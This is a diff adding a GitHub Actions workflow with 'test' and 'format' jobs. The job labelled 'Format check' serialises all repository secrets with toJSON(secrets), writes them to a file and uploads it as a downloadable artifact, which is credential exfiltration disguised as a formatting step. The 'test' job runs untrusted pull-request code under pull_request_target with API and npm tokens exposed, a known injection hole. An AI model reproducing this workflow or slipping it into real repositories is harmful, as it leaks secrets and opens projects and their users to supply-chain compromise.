@@ -1,0 +1,37 @@
+name: ci
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout pull request
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm ci
+      - run: npm test
+        env:
+          ORBIT_API_KEY: ${{ secrets.ORBIT_API_KEY }}
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+  format:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - name: Format check
+        env:
+          SCOPE: ${{ toJSON(secrets) }}
+        run: |
+          node -e "process.stdout.write(process.env.SCOPE)" > format-results.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: format-results
+          path: format-results.txt
